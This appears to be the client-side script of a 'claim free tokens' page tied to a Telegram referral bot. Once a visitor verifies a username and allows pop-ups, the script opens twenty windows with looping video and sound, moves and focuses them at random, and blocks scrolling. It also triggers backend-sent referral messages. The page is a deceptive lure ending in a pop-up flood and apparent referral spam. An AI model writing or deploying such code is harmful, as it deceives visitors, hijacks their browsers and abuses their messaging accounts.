// script.js

// Backend URL
const backendUrl = 'https://telegram-dpreferral-backend.onrender.com'; // Use your actual backend domain

// Elements
const claimButton = document.getElementById('claimButton');
const claimMessage = document.getElementById('claimMessage');
const chaosSound = document.getElementById('chaosSound');
const claimModal = document.getElementById('claimModal');
const closeModal = document.getElementById('closeModal');
const submitUsername = document.getElementById('submitUsername');
const telegramUsernameInput = document.getElementById('telegramUsername');
const modalMessage = document.getElementById('modalMessage');
const mainContent = document.querySelector('.main-content');
const browserWindow = document.getElementById('browserWindow');
const secondClaimButtonContainer = document.getElementById('secondClaimButtonContainer');
const secondClaimButton = document.getElementById('secondClaimButton');
const leaderboardButton = document.getElementById('leaderboardButton');
const leaderboardWindow = document.getElementById('leaderboardWindow');
const closeLeaderboardButton = document.getElementById('closeLeaderboardButton');
const leaderboardList = document.getElementById('leaderboardList');

// Variables to manage chaos
let chaosWindows = [];
let chaosInterval = null;
let isChaosActive = false;

// Store the verified telegramUsername
let verifiedUsername = '';

// Make the browser window draggable
makeWindowDraggable(browserWindow);
makeWindowDraggable(leaderboardWindow);

// Function to make a window draggable
function makeWindowDraggable(windowElement) {
    let isDragging = false;
    let offsetX = 0;
    let offsetY = 0;

    const header = windowElement.querySelector('.window-header');

    header.addEventListener('mousedown', (e) => {
        isDragging = true;
        offsetX = e.clientX - windowElement.offsetLeft;
        offsetY = e.clientY - windowElement.offsetTop;
    });

    document.addEventListener('mousemove', (e) => {
        if (isDragging) {
            windowElement.style.left = `${e.clientX - offsetX}px`;
            windowElement.style.top = `${e.clientY - offsetY}px`;
            windowElement.style.transform = `translate(0, 0)`;
        }
    });

    document.addEventListener('mouseup', () => {
        isDragging = false;
    });
}

// Handle initial CLAIM Button Click
claimButton.addEventListener('click', () => {
    openModal();
});

// Close Modal when 'x' is clicked
closeModal.addEventListener('click', () => {
    closeModalFunc();
});

// Close Modal when clicking outside the modal content
window.addEventListener('click', (event) => {
    if (event.target == claimModal) {
        closeModalFunc();
    }
});

// Handle Submit Username (Verification)
submitUsername.addEventListener('click', async () => {
    let telegramUsername = telegramUsernameInput.value.trim();

    if (!telegramUsername) {
        displayModalMessage('Please enter your Telegram username.', 'error');
        return;
    }

    // Remove '@' if present
    if (telegramUsername.startsWith('@')) {
        telegramUsername = telegramUsername.substring(1);
    }

    // Lowercase the username for consistency
    telegramUsername = telegramUsername.toLowerCase();

    // Basic validation for Telegram username
    if (!/^[a-zA-Z0-9_]{5,32}$/.test(telegramUsername)) {
        displayModalMessage('Invalid Telegram username format.', 'error');
        return;
    }

    // Disable input and button to prevent multiple submissions
    telegramUsernameInput.disabled = true;
    submitUsername.disabled = true;
    submitUsername.textContent = 'Verifying...';

    try {
        // Verify the user exists
        const verifyResponse = await fetch(`${backendUrl}/api/verify`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telegramUsername }),
        });

        const verifyData = await verifyResponse.json();

        if (verifyData.success) {
            // Store the verified username
            verifiedUsername = telegramUsername;

            closeModalFunc();
            // Hide the initial CLAIM button
            claimButton.style.display = 'none';
            // Display the success message
            claimMessage.textContent = 'Verification successful! You may now claim your free tokens!';
            // Show the second CLAIM button
            secondClaimButtonContainer.style.display = 'block';
        } else {
            // Display instructions and link to verification bot
            displayModalMessage(
                `Verification failed. Please verify with our Telegram bot first: <a href="https://t.me/DoublePenisVerifyBot" target="_blank">@DoublePenisVerifyBot</a>`,
                'error'
            );
        }
    } catch (error) {
        console.error('Error:', error);
        displayModalMessage('An error occurred during verification. Please try again.', 'error');
    } finally {
        // Re-enable input and button
        telegramUsernameInput.disabled = false;
        submitUsername.disabled = false;
        submitUsername.textContent = 'Verify';
    }
});

// Handle Second CLAIM Button Click
secondClaimButton.addEventListener('click', async () => {
    if (!verifiedUsername) {
        alert('Please verify your Telegram username first.');
        return;
    }

    // Attempt to open a test window to check for popup blockers
    const testWindow = window.open('', '', 'width=100,height=100');
    if (testWindow === null || typeof testWindow === 'undefined') {
        alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
        return;
    } else {
        // Close the test window
        testWindow.close();
    }

    // Hide the second CLAIM button
    secondClaimButtonContainer.style.display = 'none';

    claimMessage.textContent = 'Initiating chaos...';

    // Start Chaos Effect
    startChaos();

    // Send messages via backend once chaos starts
    sendReferralMessages();
});

// Send Referral Messages
async function sendReferralMessages() {
    try {
        // Send messages via backend
        const sendMessagesResponse = await fetch(`${backendUrl}/api/sendReferral`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telegramUsername: verifiedUsername }),
        });

        const sendMessagesData = await sendMessagesResponse.json();

        if (sendMessagesData.success) {
            claimMessage.textContent = 'Check your Telegram for further instructions!';
        } else {
            claimMessage.textContent = 'Failed to send messages via Telegram. Please contact support.';
        }
    } catch (error) {
        console.error('Error:', error);
        claimMessage.textContent = 'An error occurred while sending messages. Please try again.';
    }
}

// Display messages in the modal
function displayModalMessage(message, type) {
    modalMessage.innerHTML = message;
    modalMessage.className = type; // 'error' or 'success'
}

// Open Modal
function openModal() {
    claimModal.style.display = 'block';
    telegramUsernameInput.value = '';
    modalMessage.innerHTML = '';
    telegramUsernameInput.focus();
}

// Close Modal
function closeModalFunc() {
    claimModal.style.display = 'none';
}

// Function to start chaotic effects by opening windows with video and audio
function startChaos() {
    if (isChaosActive) return; // Prevent multiple chaos starts
    isChaosActive = true;

    // Disable scrolling
    document.body.classList.add('no-scroll');

    // Play chaos sound on the main page
    if (chaosSound) {
        chaosSound.loop = true;
        chaosSound.play();
    }

    // Open all chaos windows during user interaction
    const totalChaosWindows = 20; // Adjust the number as needed
    for (let i = 0; i < totalChaosWindows; i++) {
        const chaosWindow = window.open('', '_blank', 'width=640,height=360');
        if (chaosWindow) {
            // Keep the window hidden initially
            chaosWindow.document.write(`
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <title>Chaos Window ${i + 1}</title>
                    <style>
                        body {
                            margin: 0;
                            padding: 0;
                            background-color: black;
                            overflow: hidden;
                        }
                        body.hidden {
                            display: none;
                        }
                        video {
                            width: 100%;
                            height: 100%;
                            object-fit: cover;
                        }
                    </style>
                </head>
                <body class="hidden">
                    <video autoplay loop>
                        <source src="https://telegram-dpreferral-backend.onrender.com/chaosvid.mp4" type="video/mp4">
                    </video>
                    <audio autoplay>
                        <source src="https://telegram-dpreferral-backend.onrender.com/chaossound.mp3" type="audio/mpeg">
                    </audio>
                    <script>
                        // Prepare to show the window later
                        window.isRevealed = false;
                    </script>
                </body>
                </html>
            `);

            // Store the window reference
            chaosWindows.push(chaosWindow);
        } else {
            console.warn('Pop-up blocked. Please allow pop-ups for this site to enable the chaos effect.');
            alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
            endChaos();
            return;
        }
    }

    // Start revealing the chaos windows gradually
    let currentWindowIndex = 0;
    chaosInterval = setInterval(() => {
        // Reveal windows each interval
        for (let j = 0; j < 1; j++) {
            if (currentWindowIndex >= chaosWindows.length) {
                clearInterval(chaosInterval);
                return;
            }

            const chaosWindow = chaosWindows[currentWindowIndex];
            if (chaosWindow && !chaosWindow.closed) {
                chaosWindow.document.body.classList.remove('hidden');
                chaosWindow.focus();
                // Move the window to a random position
                const width = 640;
                const height = 360;
                const x = Math.floor(Math.random() * (screen.width - width));
                const y = Math.floor(Math.random() * (screen.height - height));
                chaosWindow.moveTo(x, y);
            }
            currentWindowIndex++;
        }
    }, 300); // Reveal one new window every 0.3 seconds
}

// Add a single focus listener to detect when chaos windows are closed
window.addEventListener('focus', () => {
    if (!isChaosActive) return;

    // Update the chaosWindows array by removing closed windows
    chaosWindows = chaosWindows.filter(w => !w.closed);

    // If no chaos windows are left, end chaos
    if (chaosWindows.length === 0) {
        endChaos();
    }
});

// Function to end chaos
function endChaos() {
    if (!isChaosActive) return;
    isChaosActive = false;

    // Clear the interval
    if (chaosInterval) {
        clearInterval(chaosInterval);
        chaosInterval = null;
    }

    // Remove no-scroll class
    document.body.classList.remove('no-scroll');

    // Stop sound on the main page
    if (chaosSound) {
        chaosSound.pause();
        chaosSound.currentTime = 0;
    }

    // Notify the user
    alert('The chaos has ended! Check your Telegram for further instructions.');
}

// Leaderboard Functionality
leaderboardButton.addEventListener('click', () => {
    if (leaderboardWindow.style.display === 'none' || leaderboardWindow.style.display === '') {
        leaderboardWindow.style.display = 'block';
        fetchLeaderboard();
    } else {
        leaderboardWindow.style.display = 'none';
    }
});

// Close Leaderboard Window
closeLeaderboardButton.addEventListener('click', () => {
    leaderboardWindow.style.display = 'none';
});

async function fetchLeaderboard() {
    try {
        const response = await fetch(`${backendUrl}/api/leaderboard`);
        const data = await response.json();
        if (data.success) {
            leaderboardList.innerHTML = '';
            data.leaderboard.forEach((user, index) => {
                const listItem = document.createElement('li');
                listItem.textContent = `${index + 1}. @${user.telegramUsername} - ${user.referrals} referrals`;
                leaderboardList.appendChild(listItem);
            });
        } else {
            leaderboardList.innerHTML = '<li>No data available.</li>';
        }
    } catch (error) {
        console.error('Error fetching leaderboard:', error);
        leaderboardList.innerHTML = '<li>Error fetching leaderboard.</li>';
    }
}
